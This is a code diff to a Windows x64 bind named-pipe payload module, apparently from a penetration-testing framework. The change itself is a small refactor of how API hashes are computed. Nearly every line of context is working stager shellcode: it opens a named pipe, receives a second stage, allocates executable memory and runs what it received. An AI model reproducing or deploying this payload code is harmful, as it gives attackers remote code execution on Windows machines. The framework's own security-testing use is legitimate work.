@@ -121,7 +121,7 @@ module Payload::Windows::BindNamedPipe_x64
         pop r8                     ; nNumberOfBytesToWrite
         sub rsp, 16                ; allocate + alignment
         mov r9, rsp                ; lpNumberOfBytesWritten
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'WriteFile')}
         call rbp                   ; WriteFile(hPipe, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten)
         add rsp, 16
     ^
@@ -159,7 +159,7 @@ module Payload::Windows::BindNamedPipe_x64
         push 0                  ; nDefaultTimeOut
         push #{chunk_size}      ; nInBufferSize
         push #{chunk_size}      ; nOutBufferSize
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CreateNamedPipeA')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'CreateNamedPipeA')}
         call rbp                ; CreateNamedPipeA
         mov rdi, rax            ; save hPipe (using sockrdi convention)
 
@@ -175,11 +175,11 @@ module Payload::Windows::BindNamedPipe_x64
       connect_pipe:
         mov rcx, rdi            ; hPipe
         xor rdx, rdx            ; lpOverlapped
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ConnectNamedPipe')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ConnectNamedPipe')}
         call rbp                ; ConnectNamedPipe
 
       ; check for failure
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetLastError')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'GetLastError')}
         call rbp                ; GetLastError
         cmp rax, 0x217          ; looking for ERROR_PIPE_CONNECTED
         jz get_stage_size       ; success
@@ -188,7 +188,7 @@ module Payload::Windows::BindNamedPipe_x64
 
       ; wait before trying again
         mov rcx, #{retry_wait}
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'Sleep')}
         call rbp                ; Sleep
         jmp connect_pipe
       ^
@@ -206,7 +206,7 @@ module Payload::Windows::BindNamedPipe_x64
         mov rdx, rsp            ; lpMode (PIPE_WAIT)
         xor r8, r8              ; lpMaxCollectionCount
         xor r9, r9              ; lpCollectDataTimeout
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetNamedPipeHandleState')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'SetNamedPipeHandleState')}
         call rbp
       ^
     end
@@ -221,7 +221,7 @@ module Payload::Windows::BindNamedPipe_x64
         mov r9, rsp             ; lpNumberOfBytesRead
         push 0                  ; alignment
         push 0                  ; lpOverlapped
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ReadFile')}
         call rbp                ; ReadFile
         add rsp, 0x30           ; adjust stack
         pop rsi                 ; lpNumberOfBytesRead
@@ -246,7 +246,7 @@ module Payload::Windows::BindNamedPipe_x64
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly received second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
       ; Receive the second stage and execute it...
       ^
@@ -275,7 +275,7 @@ module Payload::Windows::BindNamedPipe_x64
         mov rdx, rbx            ; lpBuffer
         push 0                  ; lpOverlapped
         mov rcx, rdi            ; hPipe
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'ReadFile')}
         call rbp                ; ReadFile(hPipe, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
         add rsp, 0x28           ; slight stack adjustment
         pop rdx                 ; lpNumberOfBytesRead
@@ -294,14 +294,14 @@ module Payload::Windows::BindNamedPipe_x64
         pop r8                  ; dwFreeType
         push 0                  ; 0 to decommit whole block
         pop rdx                 ; dwSize
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'VirtualFree')}
         call rbp                ; VirtualFree(payload, 0, MEM_RELEASE)
 
       cleanup_file:
       ; clean up the pipe handle
         push rdi                ; file handle
         pop rcx                 ; hFile
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'CloseHandle')}
         call rbp                ; CloseHandle(hPipe)
 
         jmp failure
@@ -333,7 +333,7 @@ module Payload::Windows::BindNamedPipe_x64
         db "kernel32", 0x00
       get_kernel32_name:
         pop rcx                 ;
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetModuleHandleA')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'GetModuleHandleA')}
         call rbp                ; GetModuleHandleA("kernel32")
 
         call get_exit_name
@@ -341,7 +341,7 @@ module Payload::Windows::BindNamedPipe_x64
       get_exit_name:
         mov rcx, rax            ; hModule
         pop rdx                 ; lpProcName
-        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
+        mov r10d, #{block_api_hash('kernel32.dll', 'GetProcAddress')}
         call rbp                ; GetProcAddress(hModule, "ExitThread")
         xor rcx, rcx            ; dwExitCode
         call rax                ; ExitProcess(0)
